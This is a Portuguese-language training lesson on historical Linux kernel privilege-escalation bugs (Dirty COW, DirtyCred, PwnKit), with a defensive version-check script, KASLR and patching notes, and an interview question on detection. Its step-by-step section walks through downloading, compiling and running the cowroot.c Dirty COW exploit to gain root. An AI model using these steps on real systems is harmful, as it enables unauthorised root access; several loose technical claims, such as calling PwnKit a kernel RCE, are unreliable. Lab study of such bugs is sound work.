# Módulo 4: Vulnerabilidades de Kernel
## Aula 02 - Histórico: Dirty COW, DirtyCred e Exploits LKM

### 1. ANALOGIA DO DIA A DIA
Lembra do problema histórico do Bilhete de Loteria? A regra diz "Você pode OLHAR seu bilhete (Somente Leitura - Read Only)". Mas se você e o seu amigo trocarem a palavra do bilhete muito rapidamente em milissegundos enquanto o avaliador oficial pisca os olhos (Race Condition), devido à ilusão de ótica da lentidão da mão do avaliador, ele registra a "Cópia" modificada e premiada no nome do "Dono do bilhete" que não tinha prêmio.
O **Dirty COW** é exatamente isso: uma ilusão de mágica na forma como o kernel copia anotações de Memória para o Disco, permitindo que um usuário comum "Escreva e Edite" um arquivo vital como `/etc/passwd`  simplesmente rodopiando ele na tela enquanto o sistema tenta copiá-lo para otimização!

### 2. O QUE É (definição técnica Senior)
Historicamente, sistemas Linux são assolados por Bug de Gerenciamento de Memória (Memory Corruption).
- **Dirty COW (CVE-2016-5195):** Falha de Race Condition no mecanismo *Copy-on-Write* (COW) no subsistema de paginação de memória do Kernel do Linux. O atacante abusava desse time-gap das threads do processador pra invocar a API de mapear arquivos temporários em mmap() e injetar strings brutais no binário read-only de senhas. Afetou o mundo todo por 9 anos antes de acharem (!).
- **DirtyCred (CVE-2022-2586):** Evolução mais limpa. Ele não destrói os as partições (o COW corrompia arquivos de disco do SO às vezes). O DirtyCred foca numa troca de Credencial no Cache vivo Ring0 (UAF - Use After Free cache slab). Troca a credencial struct de usuário comum pela estrutra privilegiada de um processo que acabou de abrir usando Heap-Spray com precisão cirurgica.
- **RCE Kernel Exploits (Ex: PwnKit PolkitPkexec CVE-2021-4034):** Bug antigo de variáveis de argumento `argc/argv` maltratados por programas nativos instalados por default nos desktop ou servers, ativado com 3 linhas de comando bash, transformou caixas Ubuntu em domínios de hackers instântaneo.

### 3. SCRIPT / COMANDO COMENTADO
Embora usar os exploits em si requeira `.c` compilado, o script abaixo é como um Analista de Segurança monitora agressivamente as Versões contra Banco de Dados:

```bash
# ============================================================
# O QUE ESTE SCRIPT FAZ:
# Extrai o "Número de Construção" da data compilada do seu
# kernel Ubuntu/Debian pra bater se a data é ANTERIOR ao Mês
# em que o exploit viria a ser corrigido no Changelog da Redhat!
# ============================================================

#!/bin/bash

echo "[*] Vendo a Data de Release do Kernel Vivo:"
# Uma forma clássica de identificar se seu servidor está parado no tempo.
# O output de "#1 SMP Wed Jan 12" entrega as vezes anos velhos de 2018.
uname -v

echo "[*] Checando a configuração Viva LKM permitidos (Proteção defensiva Senior):"
# Listamos se Alguém Atacante "INJETARIA" o Módulo de Exploit na Máquina Dinamica na Root
# kptr_restrict == 1 significa que os punteros virtuais de kernel estão escondidos do dmesg (Isso afeta os Exploits em achar os Offsets do hardware).
sysctl kernel.kptr_restrict 
```

### 4. PASSO A PASSO
**Passo 1:** Para aprender história de CVEs na unha, instale uma máquina Metasploitable 2 e outra Ubuntu 14.04 velha em iso.
**Passo 2:** Procure o source no Google: `dirtycow cve-2016 github`. O mais famoso é o `cowroot.c`.
**Passo 3:** Faça o Download para o Ubuntu 14.04: `wget https://raw.com.../cowroot.c`.
**Passo 4:** Compile usando `gcc cowroot.c -o dirty -pthread`. (O `-pthread` é EXIGÊNCIA do DirtyCOW pq ele usa threads de concorrência massivas pra estourar a Race Condition da paginação).
**Passo 5:** O terminal pisca. Execute `./dirty`. Em 3 segundos, ele injeta uma nova linha de usuário root chamado "firefart" no /etc/passwd mágico, e vc ta com root. O bug mais assustador e didático da década. 

### 5. VERIFICAÇÃO E TROUBLESHOOTING
- Se rodar Exploits LKM, Kernels modernos possuem a barreira ativada **KASLR** (Kernel Address Space Layout Randomization). Toda vez que a máquina liga, as memórias do Sistema Principal recebem um "salto aleatório" em GigaBytes. Assim, um arquivo Exploit scriptado por um moleque esperando achar o buffer na linha do RAM `0xFFBA1B`, não achará nada, causará tela e erro `Sys_Call Error`. Para bypassar KASLR o hacker precisa de "Infoleak Vulnerabilities" combinadas (um vazador passivo de logs ensinando onde o buffer real foi parar neste boot hj!).

### 6. CONCEITO SENIOR (o "porquê" profundo)
SysAdmins muitas vezes rodam `apt upgrade` ou `yum update` e ignoram a pasta do Boot... Mas o sistema Kernel DE FATO só sobe no REBOOT da placa física. Logo, eles tem o disco em 100% de compliance `Vulnerability Scans do Nessus`, mas a memória VIVA não. É o porquê de DevSecOps integrarem `needrestart` ou automações de kexec de infra imutável via Terraform. Em nuvens puras, você não gerencia VM velha que patching nela é difícil; você DESTRÓI a VM antiga (Cattle) e sob as bases do ASG e CI/CD, levanta uma AMI fresquinha (Containerized AMI's) nova todo domingo, eliminando a dor e as vulnerabilidades Kernel Memory em base contínua em escala!

### 7. PERGUNTA DE ENTREVISTA / CTF
**Pergunta:** "Se eu for um BlueTeamer analisando um servidor CentOS 7 crítico sem updates desde 2017 e infectado por cryptominer usando DirtyCOW via web shell cgi do Apache, o kernel vai apresentar logs de alertas vermelhos do estilo '*Aviso, Usuário tentou sobre-escrever ROM memory cow* ' no arquivo de log do painel Syslog ou Var Log?"
**Resposta Esperada:** NÃO. O mais desesperador em vulnerabilidade O-Day de Base Lógica / Race Condition como COW é que não causam violação de Assinaturas estáticas ou Seg-Fault num primeiro momento, e sim Abusam de uma Operação Natural legítima pervertidamente agendada do processador de memoria paginada do Linux "MMAP() and MADVISE()". Como é "Legítima" pros olhos do Kernel cego, ele jura q tava tudo bem, portanto não gera evento logado de 'intruso'. A única detecção eficaz no log é com ferramentas de IPS focadas em Tracing de Systcalls anômalos de processo x tempo com ferramentas profundas e pesadas como Auditd Profiling de comportamentos ou eBPF trace hooks via Cilium na nuvem moderna (Tetragon). O Syslog convencional fica cego.
